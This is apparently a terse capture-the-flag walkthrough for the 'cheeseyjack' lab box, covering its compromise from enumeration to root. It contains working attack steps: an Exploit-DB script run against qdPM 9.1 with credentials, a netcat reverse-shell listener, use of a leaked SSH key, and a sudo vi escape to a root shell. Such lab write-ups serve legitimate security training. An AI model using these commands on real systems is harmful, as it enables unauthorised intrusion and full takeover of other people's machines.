<pre>

$ vi /etc/hosts
	IP MACHINE 	http://cheeseyjack.local/


Enum:
	Open ports:
		22/tcp   open  ssh   	
80/tcp   open  http 	
	111/tcp  open  rpcbind



80/tcp enum:
	/assets (Status: 301)
/forms (Status: 301)
/project_management (Status: 301)
/server-status (Status: 403)
/it_security (Status: 301)

/it_security (Status: 301)
	Note.txt
		Possible user (Cheese,crab)

Found on index
	info@cheeseyjack.local
/home/ch33s3m4n *

Go to the /project_management (Status: 301)
And login:
	ch33s3m4n@cheeseyjack.local
		qdPM 9.1
Ok we login in!
	Lets exploit some webapp
		https://www.exploit-db.com/exploits/47954
			Download and run it!
python3 47954.py  -url http://cheeseyjack.local/project_management/ -u ch33s3m4n@cheeseyjack.local -p qdpm

And we get a backdoor command execution!
	Lets get reverse shell
		kali$ rlwrap nc -lvnp 9003
	Find a php-reverse-shell on your kali machine

Run linpeas.sh in ctf machine and you will find
	/var/backups/ssh-bak/key.bak
		Ssh key for crab

Lets login to it:
	ssh -i id_rsa crab@cheeseyjack.local
	And we got crab

Priv esc:
	$ sudo -l
		(root) NOPASSWD: /home/crab/.bin/

	Lets do some tricks ;)
		$ cp /bin/vi /home/crab/.bin/
		$ sudo /home/crab/.bin/vi
			:!sh
				Got root!

Flag root:
WOWWEEEE! You rooted my box! Congratulations. If you enjoyed this box there will be more coming.

Tag me on twitter @cheesewadd with this picture and i'll give you a RT!
</pre>
